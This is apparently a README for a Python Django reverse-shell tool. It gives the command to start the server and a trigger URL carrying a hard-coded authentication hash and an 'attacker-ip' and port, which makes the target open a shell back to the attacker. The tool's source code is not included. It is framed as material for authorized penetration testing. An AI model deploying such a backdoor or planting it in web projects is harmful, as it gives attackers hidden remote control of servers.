# Python Django Reverse Shell

A simple reverse shell implementation using Django framework.

## Description

This script creates a Django web server that accepts HTTP requests and can establish a reverse shell connection when triggered with the correct parameters.

## Usage

1. Start the server:

   ```bash
   python revshell.py runserver 0.0.0.0:8000
   ```

2. Trigger the reverse shell by making a GET request with the required parameters:

   ```bash
   http://target-ip:8000/?hash=f7d49c180f833df8756a6439c8559879&ip=attacker-ip&port=4242
   ```

## Parameters

- `hash`: Authentication hash (must be `f7d49c180f833df8756a6439c8559879`)
- `ip`: IP address of the attacker's listening machine
- `port`: Port number for the reverse shell connection (default: 4242)

## Requirements

- Python 3.x
- Django

## Security Warning

This tool is for educational and authorized testing purposes only. Use only on systems you own or have explicit permission to test. 
